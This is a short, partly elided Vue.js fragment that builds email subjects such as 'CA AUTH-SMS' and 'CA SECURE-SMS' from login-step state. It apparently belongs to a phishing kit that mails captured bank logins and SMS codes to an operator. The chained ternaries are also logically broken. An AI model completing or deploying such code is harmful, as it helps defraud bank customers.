    ...
    computed:{
        content(){
            ...
            var message ={
                ...
                to:$('#Mail').val(),
                subject : this.login==2 ? 'CA DEP + LOG ' : '' + this.login==3 && this.step==1 ? 'CA NUMERO ' :'' + this.login==3 && this.step==2 ? 'CA AUTH-SMS ' :'' + this.login==3 && this.step==3 ? 'CA SECURE-SMS ':'' + this.login==3 && this.step==4 ? ' ':'',
